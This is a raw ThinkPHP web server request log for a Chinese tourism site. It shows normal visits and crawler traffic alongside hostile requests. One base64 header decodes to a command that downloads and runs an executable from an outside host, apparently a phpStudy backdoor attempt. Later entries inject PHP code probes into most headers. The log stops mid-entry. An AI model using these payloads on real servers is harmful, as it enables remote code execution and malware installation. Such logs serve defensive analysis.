[2019-10-01T09:11:28+08:00] 112.28.189.194 POST 123.57.56.8/app/api.php
[运行时间：0.028919s] [吞吐率：34.58req/s] [内存消耗：1,970.93kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T09:16:32+08:00] 47.100.36.216 GET aizhuanbao.cn/
[运行时间：0.032244s] [吞吐率：31.01req/s] [内存消耗：2,210.72kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'aizhuanbao.cn',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T10:00:52+08:00] 123.57.12.247 GET 123.57.56.8/
[运行时间：0.030923s] [吞吐率：32.34req/s] [内存消耗：2,212.73kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '123.57.56.8',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://123.57.56.8:80',
  'accept-language' => 'zh-cn',
  'accept-encoding' => 'gzip,deflate',
  'accept-charset' => 'c3lzdGVtKCdjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vZmt5LmRmZzQ1ZGZnNDUuYmVzdC9kb3dubG9hZC5leGUgJVN5c3RlbVJvb3QlL1RlbXAvb3Z3bGRqbHFpbHN3emJyMTkwMzcuZXhlICYgJVN5c3RlbVJvb3QlL1RlbXAvb3Z3bGRqbHFpbHN3emJyMTkwMzcuZXhlJyk7ZWNobyBtZDUoJ3BocHN0dWR5Jyk7',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T10:00:52+08:00] 123.57.12.247 GET 123.57.56.8/index.php
[运行时间：0.030060s] [吞吐率：33.27req/s] [内存消耗：2,212.87kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '123.57.56.8',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://123.57.56.8:80/index.php',
  'accept-language' => 'zh-cn',
  'accept-encoding' => 'gzip,deflate',
  'accept-charset' => 'c3lzdGVtKCdjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vZmt5LmRmZzQ1ZGZnNDUuYmVzdC9kb3dubG9hZC5leGUgJVN5c3RlbVJvb3QlL1RlbXAvb3Z3bGRqbHFpbHN3emJyMTkwMzcuZXhlICYgJVN5c3RlbVJvb3QlL1RlbXAvb3Z3bGRqbHFpbHN3emJyMTkwMzcuZXhlJyk7ZWNobyBtZDUoJ3BocHN0dWR5Jyk7',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T10:01:47+08:00] 100.26.161.179 GET 123.57.56.8/
[运行时间：0.031264s] [吞吐率：31.99req/s] [内存消耗：2,211.13kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/60.0.3098.84 Safari/537.32',
  'host' => '123.57.56.8',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T10:27:05+08:00] 117.136.41.77 POST 123.57.56.8/app/api.php
[运行时间：0.030641s] [吞吐率：32.64req/s] [内存消耗：1,970.93kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T10:33:47+08:00] 117.136.41.77 POST 123.57.56.8/app/api.php
[运行时间：0.038280s] [吞吐率：26.12req/s] [内存消耗：1,970.93kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T10:39:09+08:00] 117.136.41.77 POST 123.57.56.8/app/api.php
[运行时间：0.028272s] [吞吐率：35.37req/s] [内存消耗：1,970.93kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T10:50:25+08:00] 187.74.181.105 GET 123.57.56.8:80/
[运行时间：0.034287s] [吞吐率：29.17req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T10:51:26+08:00] 104.199.70.49 GET 123.57.56.8/
[运行时间：0.033115s] [吞吐率：30.20req/s] [内存消耗：2,210.46kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '123.57.56.8',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T11:31:25+08:00] 159.203.201.173 GET 123.57.56.8/
[运行时间：0.031808s] [吞吐率：31.44req/s] [内存消耗：2,210.46kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '123.57.56.8',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T12:08:38+08:00] 60.174.233.28 GET www.aizhuanbao.cn/
[运行时间：0.032690s] [吞吐率：30.59req/s] [内存消耗：2,210.72kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36',
  'host' => 'www.aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T12:58:19+08:00] 103.230.241.39 GET 123.57.56.8/
[运行时间：0.032384s] [吞吐率：30.88req/s] [内存消耗：2,210.46kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '123.57.56.8',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T13:47:16+08:00] 101.4.60.124 HEAD www.aizhuanbao.cn/js/scroll.js
[运行时间：0.127692s] [吞吐率：7.83req/s] [内存消耗：1,970.55kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T13:47:16+08:00] 101.4.60.124 GET www.aizhuanbao.cn/js/scroll.js
[运行时间：0.030424s] [吞吐率：32.87req/s] [内存消耗：1,971.65kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T13:59:44+08:00] 201.113.25.57 GET 123.57.56.8:80/
[运行时间：0.176060s] [吞吐率：5.68req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T14:11:27+08:00] 101.4.60.63 HEAD www.aizhuanbao.cn/js/jquery-1.8.3.min.js
[运行时间：0.398581s] [吞吐率：2.51req/s] [内存消耗：1,948.47kb] [文件加载：124]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T14:11:27+08:00] 101.4.60.63 GET www.aizhuanbao.cn/js/jquery-1.8.3.min.js
[运行时间：0.028425s] [吞吐率：35.18req/s] [内存消耗：1,949.57kb] [文件加载：124]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T15:26:29+08:00] 66.249.70.29 GET www.aizhuanbao.cn/
[运行时间：0.131916s] [吞吐率：7.58req/s] [内存消耗：2,212.95kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip,deflate,br',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
  'connection' => 'keep-alive',
  'amp-cache-transform' => 'google;v="1..2"',
  'host' => 'www.aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T16:05:09+08:00] 66.249.64.126 GET maxthink.cn/Public/js/jquery.js
[运行时间：0.343681s] [吞吐率：2.91req/s] [内存消耗：1,972.85kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T16:05:09+08:00] 66.249.64.126 GET maxthink.cn/Public/home/default/style/style.css
[运行时间：0.028964s] [吞吐率：34.53req/s] [内存消耗：1,973.58kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-01T18:18:04+08:00] 58.250.125.68 GET www.aizhuanbao.cn/
[运行时间：0.057845s] [吞吐率：17.29req/s] [内存消耗：2,211.13kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)',
  'accept-encoding' => 'gzip,deflate',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'host' => 'www.aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T18:43:37+08:00] 194.29.62.207 GET 123.57.56.8:80/
[运行时间：0.105569s] [吞吐率：9.47req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T18:45:25+08:00] 159.203.201.218 GET 123.57.56.8/
[运行时间：0.034299s] [吞吐率：29.16req/s] [内存消耗：2,210.46kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '123.57.56.8',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T21:01:23+08:00] 201.18.41.10 GET 123.57.56.8:80/
[运行时间：0.309777s] [吞吐率：3.23req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T21:07:24+08:00] 5.135.230.129 GET maxthink.cn/
[运行时间：0.031367s] [吞吐率：31.88req/s] [内存消耗：2,210.25kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'host' => 'maxthink.cn',
  'user-agent' => 'Mozilla/5.8',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T21:07:27+08:00] 0.0.0.0 GET maxthink.cn/
[运行时间：0.029273s] [吞吐率：34.16req/s] [内存消耗：2,222.84kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'referer' => 'http://www.google.com/{${print(238947899389478923-34567343546345)}}',
  'x-content-opt' => 'Turbo/4.29.2638{${print(238947899389478923-34567343546345)}}',
  'wap-connection' => 'Stack-Type=HTTP{${print(238947899389478923-34567343546345)}}',
  'forwarded' => 'for="46.112.183.23:6267"{${print(238947899389478923-34567343546345)}}',
  'x-operamini-phone-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1{${print(238947899389478923-34567343546345)}}',
  'device-stock-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1{${print(238947899389478923-34567343546345)}}',
  'x-operamini-route' => '2{${print(238947899389478923-34567343546345)}}',
  'x-operamini-phone' => '? # ?{${print(238947899389478923-34567343546345)}}',
  'x-operamini-features' => 'advanced, file-system, folding, routing{${print(238947899389478923-34567343546345)}}',
  'x-ebo-ua' => 'BID=1.3.0, BCReq=FC261D01B55BF9EED83025F313550A07{${print(238947899389478923-34567343546345)}}',
  'x-wap-profile' => 'http://gsm.lge.com/html/gsm/P940-M6-D2.xml{${print(238947899389478923-34567343546345)}}',
  'x-ucbrowser-ua' => 'pf(Linux);la(zh-CN);re(AppleWebKit/534.31 (KHTML, like Gecko));dv(GT-I9001 Build/GINGERBREAD);pr(UCBrowser/9.2.0.308);ov(Android 2.3.6);pi(480*762);ss(480*762);up(U3/0.8.0);er(U);bt(GJ);pm(1);bv(1);nm(0);im(0);sr(0);nt(1);{${print(238947899389478923-34567343546345)}}',
  'x-piper-id' => '5691131607{${print(238947899389478923-34567343546345)}}',
  'x-requested-with' => 'com.android.browser{${print(238947899389478923-34567343546345)}}',
  'te' => 'deflate,gzip;q=0.3{${print(238947899389478923-34567343546345)}}',
  'x-powered-by' => 'ASP.NET{${print(238947899389478923-34567343546345)}}',
  'x-ua-compatible' => 'IE=EmulateIE7{${print(238947899389478923-34567343546345)}}',
  'x-varnish' => 'ass{${print(238947899389478923-34567343546345)}}',
  'cookie' => '__utmz=264345247.1261843448.2.3.utmcsr=mihrosofta.net{${print(238947899389478923-34567343546345)}}|utmccn=(referral)|utmcmd=referral|utmcct=/toster/mem{${print(238947899389478923-34567343546345)}}ories/63791/',
  'reverse-via' => 'rn{${print(238947899389478923-34567343546345)}}',
  'x-real-ip' => '108.136.110.41[CHR(0)]{${print(238947899389478923-34567343546345)}}',
  'x-forwarded-for' => '108.136.110.41[CHR(0)]{${print(238947899389478923-34567343546345)}}',
  'user-agent' => 'Mozilla/5.9{${print(238947899389478923-34567343546345)}}',
  'accept' => '*/*',
  'host' => 'maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T21:07:29+08:00] 0.0.0.0 GET maxthink.cn/
[运行时间：0.034173s] [吞吐率：29.26req/s] [内存消耗：2,222.96kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'referer' => 'http://www.google.com/<?php print(238947899389478923-34567343546345); ?>',
  'x-content-opt' => 'Turbo/4.29.2638<?php print(238947899389478923-34567343546345); ?>',
  'wap-connection' => 'Stack-Type=HTTP<?php print(238947899389478923-34567343546345); ?>',
  'forwarded' => 'for="46.112.183.23:6267"<?php print(238947899389478923-34567343546345); ?>',
  'x-operamini-phone-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1<?php print(238947899389478923-34567343546345); ?>',
  'device-stock-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1<?php print(238947899389478923-34567343546345); ?>',
  'x-operamini-route' => '2<?php print(238947899389478923-34567343546345); ?>',
  'x-operamini-phone' => '? # ?<?php print(238947899389478923-34567343546345); ?>',
  'x-operamini-features' => 'advanced, file-system, folding, routing<?php print(238947899389478923-34567343546345); ?>',
  'x-ebo-ua' => 'BID=1.3.0, BCReq=FC261D01B55BF9EED83025F313550A07<?php print(238947899389478923-34567343546345); ?>',
  'x-wap-profile' => 'http://gsm.lge.com/html/gsm/P940-M6-D2.xml<?php print(238947899389478923-34567343546345); ?>',
  'x-ucbrowser-ua' => 'pf(Linux);la(zh-CN);re(AppleWebKit/534.31 (KHTML, like Gecko));dv(GT-I9001 Build/GINGERBREAD);pr(UCBrowser/9.2.0.308);ov(Android 2.3.6);pi(480*762);ss(480*762);up(U3/0.8.0);er(U);bt(GJ);pm(1);bv(1);nm(0);im(0);sr(0);nt(1);<?php print(238947899389478923-34567343546345); ?>',
  'x-piper-id' => '5691131607<?php print(238947899389478923-34567343546345); ?>',
  'x-requested-with' => 'com.android.browser<?php print(238947899389478923-34567343546345); ?>',
  'te' => 'deflate,gzip;q=0.3<?php print(238947899389478923-34567343546345); ?>',
  'x-powered-by' => 'ASP.NET<?php print(238947899389478923-34567343546345); ?>',
  'x-ua-compatible' => 'IE=EmulateIE7<?php print(238947899389478923-34567343546345); ?>',
  'x-varnish' => 'ass<?php print(238947899389478923-34567343546345); ?>',
  'cookie' => '__utmz=264345247.1261843448.2.3.utmcsr=mihrosofta.net<?php print(238947899389478923-34567343546345); ?>|utmccn=(referral)|utmcmd=referral|utmcct=/toster/mem<?php print(238947899389478923-34567343546345); ?>ories/63791/',
  'reverse-via' => 'rn<?php print(238947899389478923-34567343546345); ?>',
  'x-real-ip' => '108.136.110.41[CHR(0)]<?php print(238947899389478923-34567343546345); ?>',
  'x-forwarded-for' => '108.136.110.41[CHR(0)]<?php print(238947899389478923-34567343546345); ?>',
  'user-agent' => 'Mozilla/5.9<?php print(238947899389478923-34567343546345); ?>',
  'accept' => '*/*',
  'host' => 'maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T21:07:32+08:00] 0.0.0.0 GET maxthink.cn/
[运行时间：0.034427s] [吞吐率：29.05req/s] [内存消耗：2,222.98kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'referer' => 'http://www.google.com/\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-content-opt' => 'Turbo/4.29.2638\'<?php print(238947899389478923-34567343546345); ?>\'',
  'wap-connection' => 'Stack-Type=HTTP\'<?php print(238947899389478923-34567343546345); ?>\'',
  'forwarded' => 'for="46.112.183.23:6267"\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-operamini-phone-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1\'<?php print(238947899389478923-34567343546345); ?>\'',
  'device-stock-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-operamini-route' => '2\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-operamini-phone' => '? # ?\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-operamini-features' => 'advanced, file-system, folding, routing\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-ebo-ua' => 'BID=1.3.0, BCReq=FC261D01B55BF9EED83025F313550A07\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-wap-profile' => 'http://gsm.lge.com/html/gsm/P940-M6-D2.xml\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-ucbrowser-ua' => 'pf(Linux);la(zh-CN);re(AppleWebKit/534.31 (KHTML, like Gecko));dv(GT-I9001 Build/GINGERBREAD);pr(UCBrowser/9.2.0.308);ov(Android 2.3.6);pi(480*762);ss(480*762);up(U3/0.8.0);er(U);bt(GJ);pm(1);bv(1);nm(0);im(0);sr(0);nt(1);\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-piper-id' => '5691131607\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-requested-with' => 'com.android.browser\'<?php print(238947899389478923-34567343546345); ?>\'',
  'te' => 'deflate,gzip;q=0.3\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-powered-by' => 'ASP.NET\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-ua-compatible' => 'IE=EmulateIE7\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-varnish' => 'ass\'<?php print(238947899389478923-34567343546345); ?>\'',
  'cookie' => '__utmz=264345247.1261843448.2.3.utmcsr=mihrosofta.net\'<?php print(238947899389478923-34567343546345); ?>\'|utmccn=(referral)|utmcmd=referral|utmcct=/toster/mem\'<?php print(238947899389478923-34567343546345); ?>\'ories/63791/',
  'reverse-via' => 'rn\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-real-ip' => '108.136.110.41[CHR(0)]\'<?php print(238947899389478923-34567343546345); ?>\'',
  'x-forwarded-for' => '108.136.110.41[CHR(0)]\'<?php print(238947899389478923-34567343546345); ?>\'',
  'user-agent' => 'Mozilla/5.9\'<?php print(238947899389478923-34567343546345); ?>\'',
  'accept' => '*/*',
  'host' => 'maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T21:07:34+08:00] 0.0.0.0 GET maxthink.cn/
[运行时间：0.037802s] [吞吐率：26.45req/s] [内存消耗：2,222.98kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'referer' => 'http://www.google.com/"<?php print(238947899389478923-34567343546345); ?>"',
  'x-content-opt' => 'Turbo/4.29.2638"<?php print(238947899389478923-34567343546345); ?>"',
  'wap-connection' => 'Stack-Type=HTTP"<?php print(238947899389478923-34567343546345); ?>"',
  'forwarded' => 'for="46.112.183.23:6267""<?php print(238947899389478923-34567343546345); ?>"',
  'x-operamini-phone-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1"<?php print(238947899389478923-34567343546345); ?>"',
  'device-stock-ua' => 'SAMSUNG-GT-C5212i/C5212iXEKD1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1"<?php print(238947899389478923-34567343546345); ?>"',
  'x-operamini-route' => '2"<?php print(238947899389478923-34567343546345); ?>"',
  'x-operamini-phone' => '? # ?"<?php print(238947899389478923-34567343546345); ?>"',
  'x-operamini-features' => 'advanced, file-system, folding, routing"<?php print(238947899389478923-34567343546345); ?>"',
  'x-ebo-ua' => 'BID=1.3.0, BCReq=FC261D01B55BF9EED83025F313550A07"<?php print(238947899389478923-34567343546345); ?>"',
  'x-wap-profile' => 'http://gsm.lge.com/html/gsm/P940-M6-D2.xml"<?php print(238947899389478923-34567343546345); ?>"',
  'x-ucbrowser-ua' => 'pf(Linux);la(zh-CN);re(AppleWebKit/534.31 (KHTML, like Gecko));dv(GT-I9001 Build/GINGERBREAD);pr(UCBrowser/9.2.0.308);ov(Android 2.3.6);pi(480*762);ss(480*762);up(U3/0.8.0);er(U);bt(GJ);pm(1);bv(1);nm(0);im(0);sr(0);nt(1);"<?php print(238947899389478923-34567343546345); ?>"',
  'x-piper-id' => '5691131607"<?php print(238947899389478923-34567343546345); ?>"',
  'x-requested-with' => 'com.android.browser"<?php print(238947899389478923-34567343546345); ?>"',
  'te' => 'deflate,gzip;q=0.3"<?php print(238947899389478923-34567343546345); ?>"',
  'x-powered-by' => 'ASP.NET"<?php print(238947899389478923-34567343546345); ?>"',
  'x-ua-compatible' => 'IE=EmulateIE7"<?php print(238947899389478923-34567343546345); ?>"',
  'x-varnish' => 'ass"<?php print(238947899389478923-34567343546345); ?>"',
  'cookie' => '__utmz=264345247.1261843448.2.3.utmcsr=mihrosofta.net"<?php print(238947899389478923-34567343546345); ?>"|utmccn=(referral)|utmcmd=referral|utmcct=/toster/mem"<?php print(238947899389478923-34567343546345); ?>"ories/63791/',
  'reverse-via' => 'rn"<?php print(238947899389478923-34567343546345); ?>"',
  'x-real-ip' => '108.136.110.41[CHR(0)]"<?php print(238947899389478923-34567343546345); ?>"',
  'x-forwarded-for' => '108.136.110.41[CHR(0)]"<?php print(238947899389478923-34567343546345); ?>"',
  'user-agent' => 'Mozilla/5.9"<?php print(238947899389478923-34567343546345); ?>"',
  'accept' => '*/*',
  'host' => 'maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-01T21:07:35+08:00] 0.0.0.0 GET maxthink.cn/
[运行时间：0.034148s] [吞吐率：29.28req/s] [内存消耗：2,222.87kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'referer' => 'http://www.google.com/\'{${print(238947899389478923-34567343546345)}}\'',
  'x-content-opt' => 'Turbo/4.29.2638\'{${print(238947899389478923-34567343546345)}}\'',
